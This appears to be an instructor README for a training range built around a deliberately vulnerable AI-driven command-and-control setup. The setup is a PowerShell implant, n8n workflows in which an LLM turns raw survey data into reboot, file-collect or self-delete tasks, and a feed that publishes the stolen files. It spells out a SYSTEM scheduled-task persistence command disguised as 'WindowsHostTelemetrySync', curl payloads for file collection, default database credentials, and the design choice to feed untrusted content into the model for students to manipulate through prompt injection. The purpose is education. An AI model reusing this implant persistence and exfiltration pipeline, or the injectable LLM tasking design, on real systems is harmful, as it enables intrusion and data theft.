# L4.5 White-Box Adversary Agent Lab Environment

This directory is a self-contained lab build for the Week 4.5 adversary-agent exercise. It provides:

- A vulnerable PowerShell implant that checks in and executes tasking.
- Three n8n workflows that manage check-in, survey analysis, and file-summary publishing.
- A Postgres queue/state store for tasking and workflow artifacts.
- Tasking and file-summary calls to the course DGX Spark inference stack through LiteLLM. This range does not run its own model server.
- An "important updates" web page that publishes summaries and links to collected files.

## Directory Layout

```
lab_env/
├── .env.example
├── docker-compose.yml
├── db/
│   └── init.sql
├── implant/
│   └── implant.ps1
├── certs/
│   └── classroom-root.crt
├── vols/
│   ├── postgres/
│   ├── n8n/
│   └── updates/
│       ├── updates.html
│       └── files/
├── workflows/
│   ├── 01-agent-checkin.json
│   ├── 02-survey-analysis-and-tasking.json
│   └── 03-file-summary-and-updates.json
└── web/
    ├── Dockerfile
    ├── nginx/
    │   ├── updates.conf
    │   └── webhook-proxy.conf
    └── html/
        ├── index.html
        └── updates.html
```

Persistent runtime data is stored under `./vols/`:

|Host path|Used by|Purpose|
|---|---|---|
|`./vols/postgres`|`l45-postgres`|database files|
|`./vols/n8n`|`l45-n8n`|n8n configuration and workflow state|
|`./vols/updates`|`l45-n8n`, `l45-updates-web`|published summaries and collected originals|

## Runtime Components

|Container|Address|Service port|Purpose|
|---|---|---|---|
|`l45-n8n`|`20.30.40.153`|`5678/tcp`|orchestration (operator UI)|
|`l45-postgres`|`20.30.40.151`|`5432/tcp`|`task_queue`, `survey_events`, `collected_files`|
|`l45-updates-web`|`20.30.40.154`|`80/tcp`|updates feed + downloadable originals|
|`l45-webhook-proxy`|`20.30.40.155`|`80/tcp`|reverse proxy for implant webhook traffic to n8n|
|`l45-updates-loopback`|`127.0.0.1:8088`|host loopback|same published files, for the viewer on this host|
|`l45-updates-viewer`|host network|—|reads `[http://127.0.0.1:8088/published/updates.html](http://127.0.0.1:8088/published/updates.html)` every 60 seconds and opens originals marked `Sensitivity: high`|

`l45-updates-web` and `l45-webhook-proxy` share one built image tag (`l45-web`) to reduce PCTE import volume. Only `updates-web` runs `docker compose build`; `webhook-proxy` reuses that image with a different nginx config mount.

Implant and workflow tasking URLs use `[http://20.30.40.155/webhook/](http://20.30.40.155/webhook/)...` (port 80 via the proxy). The proxy also forwards `/webhook-test/...` for n8n editor test URLs. Active production webhooks do not require the operator session cookie.

This stack uses the same networking posture as the unified L4.2 compose profile:

- each service gets a fixed IPv4 address on the lab segment
- no host port mappings are published
- operators connect directly to container IP + service port from the lab host or routed ops station

## Quick Start

From this `lab_env` directory:

1. Create local env file:
    - `cp .env.example .env`
2. Confirm the ipvlan parent interface in `.env` matches the lab host uplink (default `eth1`).
3. Fetch the classroom root the Spark certificate uses, then start the stack:
    
    ```
    curl -fsS http://trust.cso.ops/root_ca.crt -o certs/classroom-root.crt
    docker compose up -d
    ```
    
4. The imported workflows call `[https://litellm.teamX.cso.ops/v1](https://litellm.teamX.cso.ops/v1)` with the placeholder key `TEAM_LITELLM_KEY`. Each student replaces `teamX` and that key in `LLM Decision and Task Builder` and in `Summarize for Feed` before sending webhook traffic. The model ids stay `ollama/llama3.1:8b` and `ollama/qwen3.5:4b`. Do not put a team's LiteLLM key in the student brief.
    
5. Create the operator user once, when n8n has no owner yet:
    
    ```
    set -a
    . ./.env
    set +a
    curl -fsS -X POST "http://${N8N_IP}:5678/rest/owner/setup" \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"${N8N_OPERATOR_EMAIL}\",\"firstName\":\"${N8N_OPERATOR_FIRST_NAME}\",\"lastName\":\"${N8N_OPERATOR_LAST_NAME}\",\"password\":\"${N8N_OPERATOR_PASSWORD}\"}"
    ```
    
    If the owner already exists, this request fails. Leave that user in place.
    
6. Mint a new `n8n-auth` cookie before every offering. A cookie from a previous offering does not carry forward, even if it has not expired. `N8N_USER_MANAGEMENT_JWT_DURATION_HOURS` must already be set and `l45-n8n` recreated before this login, because the token lifetime is fixed at mint time.
    
    ```
    set -a
    . ./.env
    set +a
    curl -sD - -o /tmp/n8n-login-body.txt -X POST "http://${N8N_IP}:5678/rest/login" \
    -H 'Content-Type: application/json' \
    -d "{\"emailOrLdapLoginId\":\"${N8N_OPERATOR_EMAIL}\",\"password\":\"${N8N_OPERATOR_PASSWORD}\"}" \
    | awk 'BEGIN{IGNORECASE=1} /^set-cookie: n8n-auth=/{print}'
    ```
    
    Copy only the `n8n-auth` value. Put that value in the student brief where `n8n-auth` is listed, and in the live student copy of the brief. Do not put `N8N_OPERATOR_PASSWORD` or a LiteLLM key in the student brief.
    
7. Create one Postgres credential in n8n named `L45 Postgres` (do this before running Postgres nodes):
    
    - host: `postgres`
    - port: `5432`
    - database: `POSTGRES_DB` (default `adversary_ops`)
    - user: `POSTGRES_USER` (default `ops_admin`)
    - password: `POSTGRES_PASSWORD` (default `ops_admin_pass`)
8. Import the 3 workflow JSON files from `workflows/`.
    - These exports target `n8nio/n8n:1.97.1` (Webhook node `typeVersion: 2`).
    - Workflow exports intentionally omit Postgres credential IDs so they bind cleanly on import.
    - If you previously imported broken copies, delete them first and re-import.
    - **CLI import (recommended):** `bash docker compose exec n8n n8n import:workflow --input=/opt/l45/workflows/01-agent-checkin.json docker compose exec n8n n8n import:workflow --input=/opt/l45/workflows/02-survey-analysis-and-tasking.json docker compose exec n8n n8n import:workflow --input=/opt/l45/workflows/03-file-summary-and-updates.json`

- **UI import (alternative):** In n8n, open **Workflows** → **Import from file** and select the same three JSON files from `workflows/`.
    9. Open each imported workflow and assign `L45 Postgres` to every Postgres node (Fetch Pending Task, Claim Task, Save Survey Event, Enqueue Follow-on Task, Save Collected Metadata).
    10. Activate all three workflows.

## Export Compose Images Bundle

From this `lab_env` directory, run:

- `./save-images.sh`

The script resolves all images required by `docker-compose.yml`, pulls/builds missing images if needed, then writes `images.tar.gz` into this same directory.

On an offline/target host, import the bundle with:

- `gunzip -c images.tar.gz | docker load`

## Network Access Notes

- Default segment: `20.30.40.0/24` with gateway `20.30.40.1`.
- Override `LAB_NETWORK_SUBNET`, `LAB_NETWORK_GATEWAY`, and per-service `*_IP` values in `.env` when mapping onto a team-specific PCTE segment.
- Ensure remote ops stations can route to the container block before testing implant check-ins at [http://20.30.40.155/webhook/agent-checkin](http://20.30.40.155/webhook/agent-checkin) or opening the updates page at [http://20.30.40.154/](http://20.30.40.154/).

## Implant Behavior

The implant is intentionally simple and permissive:

- Uses a hard-coded check-in URL: `[http://20.30.40.155/webhook/agent-checkin](http://20.30.40.155/webhook/agent-checkin)`
- Runs once and exits (scheduled task provides recurring execution)
- Supports tasks:
    - `survey`: hostname + process list + logged-on user context + recursive user-profile document listing
    - `collect`: reads file and sends base64 content + text preview
    - `reboot`: real reboot (`Restart-Computer -Force` or `shutdown /r`)
    - `delete_self` / `delete`: removes scheduled task and implant file

Run manually on Windows target:

- `powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\hostsvc\implant.ps1`

Install as recurring scheduled task (5-minute cadence):

- `schtasks /Create /SC MINUTE /MO 5 /TN "WindowsHostTelemetrySync" /TR "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\hostsvc\implant.ps1" /RU SYSTEM`

## Webhook Contracts

### 1) Check-in (`/webhook/agent-checkin`)

Expected request fields:

- `agent_id`
- `host_name`
- `checkin_time_utc`
- `os`

Response shape:

- `task_type`
- `task_payload`
- `report_urls.survey`
- `report_urls.collection`

### 2) Survey Result (`/webhook/agent-survey`)

Expected request fields:

- `agent_id`
- `host_name`
- `process_list` (array)
- `document_listing` (array)
- `logged_on_users` (optional array of user entries; used for admin-login reboot logic)

Behavior:

- Persists raw survey event in Postgres.
- Sends normalized survey text to Ollama for a strict JSON task decision.
- Parses the LLM response and enqueues only valid implant task types:
    - administrator/disruption evidence can produce `reboot`
    - a high-priority document path can produce `collect`
    - monitoring, incident-response, or burn-risk evidence can produce `delete_self`
- Keeps a narrow task allow-list while intentionally trusting untrusted survey content enough for student manipulation.

### 3) File Collection (`/webhook/agent-collection`)

Expected request fields:

- `agent_id`
- `source_path`
- `file_name`
- `content_base64`
- `text_preview`

Behavior:

- Summarizes content with `qwen3.5:4b` through the team inference stack.
- Writes original to `/shared/published/files/<timestamp>_<filename>`.
- Appends summary card with file link to `/shared/published/updates.html`.
- Persists metadata in Postgres.

## Validation Sequence

Prerequisites: all three workflows are imported, Postgres credential is assigned, and each workflow is **Active** (production webhook URLs use `/webhook/...`, not `/webhook-test/...`).

1. Confirm containers:
    - `docker compose ps`
2. Verify proxy and updates page: `bash curl -fsS [http://20.30.40.155/healthz](http://20.30.40.155/healthz) curl -fsS [http://20.30.40.154/](http://20.30.40.154/) | head`

### Workflow test commands (curl)

Use the webhook proxy (`20.30.40.155`) to mirror implant traffic. These requests do not use the operator session cookie.

**Optional — direct to n8n (operator debugging):** replace the host with `[http://20.30.40.153:5678](http://20.30.40.153:5678)`. Production webhook paths do not require the cookie.

#### 1) Check-in dispatcher

```
curl -fsS -X POST http://20.30.40.155/webhook/agent-checkin \
  -H 'Content-Type: application/json' \
  -d '{
    "event_type": "agent_checkin",
    "agent_id": "alpha-node-01",
    "host_name": "lab-win01",
    "checkin_time_utc": "2026-06-10T12:00:00Z",
    "os": "windows"
  }'
```

Expected: JSON with `task_type` (often `survey` when no pending task exists), `task_payload`, and `report_urls`.

#### 2) Survey analysis and tasking

Reboot outcome (`reboot`) example — includes an active administrator session:

```
curl -fsS -X POST http://20.30.40.155/webhook/agent-survey \
  -H 'Content-Type: application/json' \
  -d '{
    "event_type": "survey_result",
    "agent_id": "alpha-node-01",
    "host_name": "lab-win01",
    "logged_on_users": [
      {"username": "LAB\\Administrator", "is_admin": true}
    ],
    "process_list": [
      {"Name": "explorer", "Id": 3000, "Path": "C:\\Windows\\explorer.exe"}
    ],
    "document_listing": [
      {
        "full_path": "C:\\Users\\Public\\Documents\\team_notes.txt",
        "size_bytes": 4096,
        "last_write_time": "2026-06-10T11:30:00Z"
      }
    ]
  }'
```

Expected: the LLM decision should queue a follow-on `reboot` task.

Collect outcome (`collect`) example — includes a likely sensitive document path:

```
curl -fsS -X POST http://20.30.40.155/webhook/agent-survey \
  -H 'Content-Type: application/json' \
  -d '{
    "event_type": "survey_result",
    "agent_id": "alpha-node-01",
    "host_name": "lab-win01",
    "logged_on_users": [
      {"username": "LAB\\jsmith", "is_admin": false}
    ],
    "process_list": [{"Name": "notepad", "Id": 2222}],
    "document_listing": [
      {"full_path": "C:\\Users\\jsmith\\Documents\\confidential_budget.docx", "size_bytes": 128}
    ]
  }'
```

Expected: the LLM decision should queue a follow-on `collect` task for the selected path.

Delete-self outcome (`delete_self`) example — includes Velociraptor process evidence:

```
curl -fsS -X POST http://20.30.40.155/webhook/agent-survey \
  -H 'Content-Type: application/json' \
  -d '{
    "event_type": "survey_result",
    "agent_id": "alpha-node-01",
    "host_name": "lab-win01",
    "logged_on_users": [
      {"username": "LAB\\jsmith", "is_admin": false}
    ],
    "process_list": [{"Name": "Velociraptor.exe", "Id": 9999}],
    "document_listing": [
      {"full_path": "C:\\Users\\analyst\\Desktop\\meeting_notes.txt", "size_bytes": 128}
    ]
  }'
```

Expected: the LLM decision should queue a follow-on `delete_self` task.

No-task outcome example — no admin login, no sensitive path, no Velociraptor process:

```
curl -fsS -X POST http://20.30.40.155/webhook/agent-survey \
  -H 'Content-Type: application/json' \
  -d '{
    "event_type": "survey_result",
    "agent_id": "alpha-node-01",
    "host_name": "lab-win01",
    "logged_on_users": [
      {"username": "LAB\\student", "is_admin": false}
    ],
    "process_list": [{"Name": "notepad", "Id": 1111}],
    "document_listing": [
      {"full_path": "C:\\Users\\student\\Documents\\notes.txt", "size_bytes": 256}
    ]
  }'
```

Expected: JSON response normally shows `queued_task_count: 0`. If the local model over-interprets weak evidence, inspect the execution log and note which prompt text caused the task selection.

#### 3) File collection and updates feed

```
curl -fsS -X POST http://20.30.40.155/webhook/agent-collection \
  -H 'Content-Type: application/json' \
  -d '{
    "event_type": "file_collection_result",
    "agent_id": "alpha-node-01",
    "host_name": "lab-win01",
    "source_path": "C:\\Users\\jsmith\\Documents\\confidential_budget.docx",
    "file_name": "confidential_budget.docx",
    "collected_time_utc": "2026-06-10T12:05:00Z",
    "content_base64": "SGVsbG8gZnJvbSBsYWIgdGVzdCBkb2N1bWVudC4=",
    "text_preview": "Hello from lab test document."
  }'
```

Expected: JSON with `status: published`, `summary_link`, and `file_link`.

Verify published output:

```
curl -fsS http://20.30.40.154/published/updates.html | tail -n 20
curl -fsS http://20.30.40.154/published/files/ | head
```

#### End-to-end smoke (check-in → survey → check-in again)

After the survey curl above, request tasking again and confirm queued work is returned:

```
curl -fsS -X POST http://20.30.40.155/webhook/agent-checkin \
  -H 'Content-Type: application/json' \
  -d '{
    "event_type": "agent_checkin",
    "agent_id": "alpha-node-01",
    "host_name": "lab-win01",
    "checkin_time_utc": "2026-06-10T12:01:00Z",
    "os": "windows"
  }'
```

Expected: `task_type` of `reboot`, `collect`, or `delete_self` depending on the previous LLM task decision.

Check Postgres task queue:

```
docker compose exec postgres psql -U ops_admin -d adversary_ops \
  -c "select id, agent_id, task_type, status, created_at from task_queue order by id desc limit 20;"
```

Adjust `ops_admin` / `adversary_ops` if you changed `.env` values.

### Troubleshooting: Postgres credential errors

If a Postgres node fails with `Credential with ID "replace-postgres-credential-id" does not exist`:

1. Delete the old imported workflows.
2. Pull the latest workflow JSON files (they no longer embed placeholder credential IDs).
3. Re-import the three workflows.
4. Assign `**L45 Postgres**` to each Postgres node and save.

If a node shows a red credential warning after import, open the node, select `**L45 Postgres**`, and save the workflow.

## Reset

From this `lab_env` directory:

1. `docker compose down`
2. Remove persisted state under `./vols/postgres`, `./vols/n8n`, and `./vols/updates/files`.
3. Restore the seed updates feed if needed:
    - copy `web/html/updates.html` to `vols/updates/updates.html`
4. `docker compose up -d`
5. Mint a new `n8n-auth` cookie (Quick Start step 6) and put it in the student brief.
6. Re-import workflows and re-bind Postgres credential: `bash docker compose exec n8n n8n import:workflow --input=/opt/l45/workflows/01-agent-checkin.json docker compose exec n8n n8n import:workflow --input=/opt/l45/workflows/02-survey-analysis-and-tasking.json docker compose exec n8n n8n import:workflow --input=/opt/l45/workflows/03-file-summary-and-updates.json`

## White-Box / Vulnerability-by-Design Notes

This build intentionally does **not** enforce strong safety controls. It is designed for student manipulation of adversary workflows:

- raw untrusted survey content is sent directly into model prompts
- parsed LLM task decisions feed the implant task queue
- workflow decision logic is easy to tamper with in n8n UI
- minimal inbound schema enforcement on webhook payloads
- direct file publication pipeline with permissive handling

Do not reuse this stack as a production design pattern.